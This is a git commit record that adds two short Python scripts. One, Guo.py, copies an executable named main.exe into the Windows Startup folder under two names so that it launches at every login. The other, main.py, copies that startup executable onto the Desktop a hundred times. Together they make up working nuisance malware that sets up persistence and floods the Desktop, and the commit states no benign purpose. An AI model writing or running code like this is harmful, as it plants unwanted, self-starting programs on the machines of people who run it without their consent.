b81d071d0bcc28259978bf96a756f0e64844d977
Chenyixin-MIDI <abc11009988@163.com>
2024-09-07 15:18:33 +0800

    Add files via upload

---
+++ Guo.py
@@ -0,0 +1,4 @@
+import shutil
+
+shutil.copy("main.exe","C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.exe")
+shutil.copy("main.exe","C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Guo.exe")
---
+++ main.py
@@ -0,0 +1,3 @@
+import shutil
+for i in range(100):
+    shutil.copy("C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Guo.exe","C:/Users/Administrator/Desktop/Gou"+str(i))
